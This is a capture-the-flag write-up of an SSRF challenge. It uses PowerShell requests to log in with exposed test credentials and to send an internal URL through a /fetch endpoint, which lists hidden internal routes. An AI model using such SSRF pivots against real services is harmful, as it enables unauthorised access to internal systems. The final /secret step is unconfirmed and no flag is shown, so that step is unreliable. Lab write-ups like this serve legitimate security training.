## NZCSC API SSRF

I started by opening the challenge site and reading the OpenAPI description. It showed three endpoints: `/login`, `/challenge`, and `/fetch`, and the description said the service fetches remote resources on behalf of authenticated users. The login example also exposed the test credentials, but the schema example used `nzcscdev` as the username while the prose said `nzcsdev`, which turned out to matter.

## Recon and login

The first task was to authenticate. A normal PowerShell JSON POST to `/login` with `nzcsdev` failed with `Invalid credentials`, but using the schema example username `nzcscdev` with password `ctf2026` returned a bearer token.

Example request:
```powershell
$body = '{"username":"nzcscdev","password":"ctf2026"}'
Invoke-RestMethod -Uri "https://chall04.r0.nzcsc.org.nz/login" -Method POST -ContentType "application/json" -Body $body
```

The response included a JWT-style bearer token, which was then used for the protected endpoints.

## Challenge briefing

After authenticating, I requested `/challenge`. The briefing stated the objective was to “find and read a sensitive resource that should not be accessible from outside,” gave the flag format as `NZCSC{...}`, and hinted that “not all services need to be public to be reachable.” It also named the endpoint and body format for the attack: `POST /fetch` with `{"url":"http://internal-api"}`.

## Internal service discovery

Using the token, I submitted the internal host to `/fetch`:
```powershell
$body = '{"url":"http://internal-api"}'
Invoke-RestMethod -Uri "https://chall04.r0.nzcsc.org.nz/fetch" -Method POST -ContentType "application/json" -Headers @{ Authorization = "Bearer $token" } -Body $body
```

That returned a JSON response from the internal service:
```json
{"endpoints":["/health","/secret"],"service":"NZCSC API","status":"running","version":"1.0.0"...}
```

This confirmed the fetcher could reach internal-only services and exposed two interesting endpoints on the internal API: `/health` and `/secret`. 

## Exploitation

The obvious next step is to fetch the hidden internal endpoint directly:
```powershell
$body = '{"url":"http://internal-api/secret"}'
Invoke-RestMethod -Uri "https://chall04.r0.nzcsc.org.nz/fetch" -Method POST -ContentType "application/json" -Headers @{ Authorization = "Bearer $token" } -Body $body
```

Because the challenge objective explicitly asked for a sensitive resource and the internal service advertised `/secret`, this is the likely path to the flag. If that endpoint rejects the request, the same fetcher can be tested with variations like `http://internal-api:80/secret` or `http://internal-api/health`.

## Root caus

This challenge is a straightforward server-side request forgery issue. The authenticated `/fetch` endpoint is allowed to retrieve arbitrary URLs, and the target `http://internal-api` was reachable only from the server’s network, not from the outside. That let me pivot from the public API into the private internal service and enumerate its hidden route.

## Notes

The important quirks were:
- The login schema example username was `nzcscdev`, not `nzcsdev`. 
- The token must be copied in full, because truncated JWTs fail authentication. 
- The fetcher returned the response body, which made internal enumeration easy. 

The flag itself should come from the `/secret` response.
